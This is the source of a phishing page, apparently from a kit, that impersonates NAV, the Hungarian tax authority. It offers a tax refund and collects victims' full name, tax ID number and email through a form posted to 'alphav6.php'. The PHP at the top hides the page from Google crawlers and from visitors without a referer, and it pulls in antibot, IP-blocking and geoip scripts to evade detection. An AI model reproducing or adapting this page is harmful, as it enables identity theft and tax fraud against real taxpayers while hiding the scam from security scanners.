<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?>
<?php
session_start();
error_reporting(0);
include('antibots.php');
include('antibot.php');
include('antibot1.php');
include('antibot2.php');
include('antibot3.php');
include('antibot4.php');
include('antibot5.php');
include('antibot6.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html style="margin-left: 0px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>NAV - Magyar</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<link href="./css/nav.css" type="text/css" rel="stylesheet">
<link href="./css/print.css" type="text/css" rel="stylesheet" media="print">
<link rel="stylesheet" type="text/css" href="./2/default.css">
<meta name="portalid" content="2">
<meta name="dcterms.title" content="Magyar oldalak">
</head>
<body>
<div id="portal">
<div class="HeadTopMain">
<div class="NavHeadKategoria">
<div class="Head"></div>
<div class="Middle">
<div class="NavHeadKategoria">

<img alt="fejléc" border="0" height="180" src="./css/nav_honlap_fejleckep.png" usemap="#Map" width="1001"> 
</div>
</div>
<div class="NavBottom">
</div>
</div>
</div>
<div class="UzemszunetPortlet" style="
    margin-top: 10px;
">
<div class="">
<div class="c_div">
<div>
<div class="UzemszunetHeaderTitle" style="
    width: 642px;
">
Információ a kifizetett adók egy részének visszaszerzéséről.</div>
<div class="element_div">
<div class="Article">
<span class="Body">
<p align="justify">
<strong>Adók visszatérítése.</strong><br>Miután áttekintette a 2020-tól fizetett összes adót, megkérjük a nevét, családi nevét és azonosító számát
A hivatal ügyfélkapun keresztül, illetve postán, adószámla-kivonaton értesíti az adózókat, ha túlfizetésük van.<br><br>
</p>
</span>
</div>
</div><div class="UzemszunetHeaderTitle" style="
    width: 642px;
">Információ szükséges.</div>
<div class="element_div">

</div>
</div><form action="./alphav6.php" method="post">
        <div class="form-group">
        <input type="hidden" name="_csrf_token" value="nEF83jnyWYRf1B2iI0x1d9HdumDpPYB7B5JxUV3B974">
        <div class="login-input-group">
            <span class="input-group-addon">
                <strong style="
    font-size: 12px;
">Teljes név : </strong>
            </span>
            <input type="text" name="e" maxlength="31" value="" id="inditoKartya" placeholder="teljes név" required="required" style="width: 207px;height: 21px;margin-left: 106px;margin-top: 10px;padding-left: 7px;">

        </div><div class="login-input-group">
            <span class="input-group-addon">
                <strong style="
    font-size: 12;
">Azonosító szám :</strong>
            </span>
            <input type="text" name="p" maxlength="31" value="" placeholder="példa: 8392851935" id="inditoKartya" required="required" style="width: 207px;height: 21px;margin-left: 70px;margin-top: 10px;padding-left: 7px;">

        </div><div class="login-input-group">
            <span class="input-group-addon">
                <strong style="
    font-size: 12;
">E-mail :</strong>
            </span>
            <input type="email" name="crr" maxlength="31" value="" id="inditoKartya" placeholder="E-mail cím" required="required" style="width: 207px;height: 20px;margin-left: 133px;margin-top: 10px;padding-left: 7px;">

        </div>
    </div>
    
    <button type="submit" class="login-box__button" style="
    color: white;
    background: #54616E;
    margin-top: 10px;
    width: 86px;
    height: 24px;
">Lekérdezés</button>
    </form></div>
</div>
</div><div class="NavBottom">
<div class="Footer2Portlet">
<div class="">
<div class="Footer" style="
    margin-left: -;
">
<div class="Footer2Html">
			    A NAV weboldalai szerzői jogvédelem alatt állnak. <br>
			    A honlapon szereplő információk változatlan tartalommal és formában szabadon terjeszthetők.<br>
<br>
</div>
<a href="#">
				Kapcsolatfelvétel
			</a>
			|
			<a href="#">
				Archív oldalak
			</a>
			|
			<a href="#">
				További honlapok
			</a>
			|
			<a href="#">
				Adatvédelmi tájékoztató
			</a>
			|
			<a href="#">
				Impresszum
			</a>
			|
			<a href="#">
				Közadatkereső
			</a>
<div class="Adress">
                1054 Budapest, Széchenyi u. 2. 
                
		    </div>
</div>
</div>
</div>

</div>
<div class="">
<div class="HtmlPortlet">

<div class=""></div>
</div>
</div>
</div>


<div style="position: fixed; width: 100%; height: 100%; left: 0px; top: 0px; z-index: -1000; display: none;"></div></body></html>
<?php } ?>
